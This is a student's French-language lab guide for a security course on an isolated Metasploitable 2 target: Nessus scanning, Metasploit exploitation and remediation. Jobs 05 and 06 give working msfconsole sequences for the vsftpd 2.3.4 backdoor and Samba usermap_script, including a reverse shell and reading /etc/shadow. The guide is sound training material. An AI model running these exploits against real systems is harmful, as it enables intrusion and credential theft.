# Guide de lab (pour moi) — comment faire les manips

> Ce fichier est mon mode d'emploi perso pour réaliser le lab. Il n'est pas le livrable de
> soutenance : les résultats et captures vont dans le README. À chaque étape, **je fais une
> capture** et je la dépose dans le bon dossier `captures/jobXX-.../`.

## Règle de sécurité (à respecter et à dire au jury)

Metasploitable 2 est une machine **truffée de failles volontaires**. Elle ne doit **jamais**
toucher Internet ni le réseau de la maison/entreprise. Dans VirtualBox/VMware, je mets les
deux VM sur un **réseau interne / host-only** : elles se voient entre elles, point.

---

## Job 02 — VM Metasploitable 2 (VMware)

Le zip de Metasploitable contient **déjà une VM VMware** : le fichier `Metasploitable.vmx`
(avec le `.vmdk`, `.nvram`…). Pas besoin de créer une VM ni de déplacer le `.vmdk`.

1. Télécharger `metasploitable-linux-2.0.0.zip` (SourceForge) et dézipper.
2. (Optionnel) déplacer **tout le dossier** `Metasploitable2-Linux` dans
   `Documents\Virtual Machines\`.
3. VMware → **Fichier → Ouvrir une machine virtuelle** → choisir `Metasploitable.vmx`.
4. Paramètres de la VM → **Carte réseau → Hôte uniquement** (même réseau que la VM Debian).
5. Démarrer → au premier lancement, choisir **« Je l'ai copiée »**.
6. Connexion : **msfadmin / msfadmin**. Relever l'IP : `ip a` (interface `eth0`).
   → **la noter dans le README**.

📸 Captures : VM qui boote, login réussi, sortie de `ip a`.

---

## Job 03 — VM Debian + Nessus (+ Metasploit)

### Debian (VMware)

Il n'existe pas de VM Nessus prête à l'emploi (Nessus = logiciel à installer sur un OS).
Le plus rapide : **réutiliser l'OVA Debian 13** (Fichier → Ouvrir → le `.ova`), ou cloner la
VM `Debian13-Base` existante. À défaut, créer une VM et installer Debian depuis l'ISO.

- **Dimensionnement conseillé** : RAM **4 Go**, **2 vCPU**, disque **25-30 Go**
  (Nessus + ses plugins sont gourmands ; 1 Go de RAM / 8 Go de disque sont trop justes).
- Carte réseau → **Hôte uniquement**, le **même** réseau que Metasploitable.
- Relever son IP (`ip a`) → la noter.
- Vérifier que les deux VM se pingent : `ping <IP_metasploitable>`.

### Nessus Essentials

1. Sur https://www.tenable.com/products/nessus/nessus-essentials → récupérer un **code
   d'activation** (gratuit) + télécharger le `.deb` Debian.
2. Installer :
   ```bash
   sudo dpkg -i Nessus-*-debian*.deb
   sudo systemctl start nessusd
   sudo systemctl enable nessusd
   ```
3. Ouvrir **https://localhost:8834** (accepter l'avertissement TLS auto-signé).
4. Choisir « Nessus Essentials », coller le code, **créer le compte admin**.
   - 🔒 Mot de passe saisi dans l'interface, **jamais** mis dans une capture ni dans le dépôt.
5. Nessus compile ses plugins (long, 10–30 min). On attend que ce soit « Ready ».

📸 Captures : service `nessusd` actif, page de login, écran « plugins compiling », accueil.

### Metasploit (sur la même Debian, ou une Kali)

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall && sudo ./msfinstall
msfconsole        # premier lancement
```
> Alternative plus simple : utiliser une VM **Kali Linux**, Metasploit est déjà installé.

---

## Job 04 — Scan Nessus et analyse

1. Nessus → **New Scan** → **Basic Network Scan**.
2. Name : `Metasploitable2` · Targets : `<IP_metasploitable>`.
3. **Save** puis **Launch** (▶). Attendre la fin.
4. Ouvrir le rapport → trier par **sévérité**.
5. Pour chaque **Critical/High**, noter : nom, port/service, **CVE**, et le **type**
   (ex. backdoor, exécution de code à distance, défaut d'authentification…).

Sur Metasploitable 2 on trouve classiquement : **vsftpd 2.3.4 backdoor**, **Samba
usermap_script (CVE-2007-2447)**, **UnrealIRCd backdoor**, **distcc**, services obsolètes…

📸 Captures : liste des vulnérabilités triées, détail de 2–3 criticals (avec la solution Nessus).
➡️ Remplir le tableau du Job 04 dans le README.

---

## Job 05 — Exploiter une vulnérabilité (exemple simple)

Exemple conseillé : **vsftpd 2.3.4 backdoor** (rapide, donne un shell root).

```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <IP_metasploitable>
show payloads
set PAYLOAD cmd/unix/interact
run
# si ça marche :
id        # -> uid=0(root)  => on est root
whoami
```

**La payload `cmd/unix/interact`** : elle ne « charge » rien sur la cible ; elle se contente
d'ouvrir une **session de commande** sur le shell que le backdoor a déjà ouvert (port 6200).
À expliquer : une payload = ce qu'on exécute une fois la faille déclenchée (ici, juste
reprendre la main sur un shell).

📸 Captures : config du module (`show options`), `run`, sortie de `id`/`whoami`.

---

## Job 06 — Vulnérabilité SMB + post-exploitation

Exemple conseillé : **Samba « username map script » — CVE-2007-2447** (c'est du SMB).

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS <IP_metasploitable>
set LHOST <IP_debian>
set PAYLOAD cmd/unix/reverse
run
# session ouverte en root :
id
uname -a
cat /etc/passwd
cat /etc/shadow        # collecte d'infos (hashes)
```

Post-exploitation = ce qu'on fait **après** avoir l'accès : collecte d'infos (`/etc/passwd`,
`/etc/shadow`, config), repérage du système (`uname -a`), persistance, etc.

⚠️ Point honnête à dire au jury : sur Metasploitable, beaucoup de services tournent **déjà en
root**, donc l'exploit donne directement les privilèges max — l'« élévation de privilèges »
n'est pas nécessaire ici, et c'est justement une **mauvaise pratique** de la cible.

> Pour obtenir une vraie session **Meterpreter** (plus riche : `sysinfo`, `hashdump`,
> `download`…), on peut viser un service le permettant (ex. module Java/distcc) ou upgrader la
> session. À tester si le temps le permet, sinon on reste sur le shell de commande.

📸 Captures : options du module, session obtenue, commandes de post-exploitation.

---

## Job 07 — Correction

Pour chaque vulnérabilité exploitée, proposer le correctif :

- **vsftpd 2.3.4** : version piégée → **mettre à jour** vsftpd, réinstaller depuis une source
  saine.
- **Samba usermap_script** : **mettre à jour** Samba, supprimer l'option `username map script`.
- Général : **désactiver les services inutiles**, **pare-feu**, **segmentation réseau**,
  comptes/mots de passe robustes, et surtout **mises à jour régulières** + **audits
  périodiques** (un scan Nessus récurrent).

📸 Captures : extrait de la « solution » donnée par Nessus pour 2–3 findings.
